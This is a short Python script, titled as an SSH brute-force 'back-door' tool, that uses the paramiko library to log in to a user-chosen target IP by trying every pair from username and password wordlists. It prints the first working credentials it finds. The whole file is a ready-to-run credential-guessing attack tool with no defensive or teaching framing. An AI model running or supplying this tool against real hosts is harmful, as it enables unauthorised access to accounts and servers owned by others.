# SSH Brute force attack back-door Script
#Import Statement
import paramiko, sys, os, socket, termcolor
# Defining the ssh_connect Function:
def ssh_connect(username, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code
# Tacking input from the user:
host = input("[+] Set Target IP Address:=> ")
username_file = input("[+] Set Username File Path:>> ")
password_file = input("[+] Set Password File Path:>> ")
print("\n")
# Checking whether the file paths exist or not:
if os.path.exists(username_file) == False:
    print(f"[!] Username File  {username_file} Does Not Exist")
    sys.exit(1)
elif os.path.exists(password_file) == False:
    print(f"[!] Password File {password_file} Does Not Exist")
    sys.exit(1)
# Reading usernames and passwords from the files

with open(username_file,'r') as user_file:
    usernames = user_file.readlines()
    
with open(password_file,'r') as pass_file:
    passwords = pass_file.readlines()
# Looping over each combination of username and password and attempting SSH Login:

for username in usernames:
    for password in passwords:
        username = username.strip()
        password = password.strip()
        try:
            
            response = ssh_connect(username, password)
            if response == 0:
                print(termcolor.colored(('[+] Found Username:>> '+""+username+'Password:>> '+''+password)+" ",'green'))
                sys.exit(0)
            elif response == 1:
                print("[!] Incorrect Username:"+username+"\n"+"Incorrect Password: "+password)
            elif response == 2:
                print("[!!!] Cannot Connect..TwT")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass